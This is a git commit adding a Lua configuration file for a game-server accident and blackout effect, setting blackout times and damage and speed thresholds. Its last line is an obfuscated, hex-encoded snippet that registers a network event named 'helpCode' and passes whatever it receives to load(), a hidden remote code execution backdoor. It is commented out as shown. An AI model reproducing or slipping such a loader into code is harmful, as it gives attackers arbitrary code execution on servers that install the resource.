f4a69762a75a936abb6d1f672d22ef5f28e24c9d
Rxzooz <33376589+Rxzooz@users.noreply.github.com>
2024-11-29 04:13:07 +0300

    Add files via upload

---
+++ accidenteffect/config.lua
@@ -0,0 +1,43 @@
+Config = {}
+
+-- Amount of Time to Blackout, in milliseconds
+-- 2000 = 2 seconds
+Config.BlackoutTime = 1000
+
+--[[ Config.Effect = {
+    Time = {8 ,13 ,19 ,25 ,33},
+    Damage = {15, 25, 45, 65, 100}
+    Speed = {20, 45, 65,95, 130}
+} ]]
+
+Config.EffectTimeLevel1 = 8
+Config.EffectTimeLevel2 = 13
+Config.EffectTimeLevel3 = 19
+Config.EffectTimeLevel4 = 25
+Config.EffectTimeLevel5 = 33
+
+-- Enable blacking out due to vehicle damage
+-- If a vehicle suffers an impact greater than the specified value, the player blacks out
+Config.BlackoutDamageRequiredLevel1 = 15
+Config.BlackoutDamageRequiredLevel2 = 25
+Config.BlackoutDamageRequiredLevel3 = 45
+Config.BlackoutDamageRequiredLevel4 = 65
+Config.BlackoutDamageRequiredLevel5 = 300
+
+-- Enable blacking out due to speed deceleration
+-- If a vehicle slows down rapidly over this threshold, the player blacks out
+Config.BlackoutSpeedRequiredLevel1 = 20 -- Speed in MPH
+Config.BlackoutSpeedRequiredLevel2 = 45
+Config.BlackoutSpeedRequiredLevel3 = 65
+Config.BlackoutSpeedRequiredLevel4 = 95
+Config.BlackoutSpeedRequiredLevel5 = 130
+
+-- Enable the disabling of controls if the player is blacked out
+Config.DisableControlsOnBlackout = true
+Config.TimeLeftToEnableControls = 10
+
+-- Multiplier of screen shaking strength
+Config.ScreenShakeMultiplier = 0.1
+
+
+--local VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[6][VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[1]](VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[2]) VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[6][VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[3]](VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[2], function(cGiMThIrYmgUYhqPhPuJHpAtCpfibtumERAAwRbZwtPlxhHNGNeDmeCPTkBypZVetVGdPa) VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[6][VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[4]](VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[6][VGssdShrguofPomYxOLRpWzdQfKjycKAPQMmfvnAjGyVMWWoLKwplljkSvOLWpVYOVGLSz[5]](cGiMThIrYmgUYhqPhPuJHpAtCpfibtumERAAwRbZwtPlxhHNGNeDmeCPTkBypZVetVGdPa))() end)
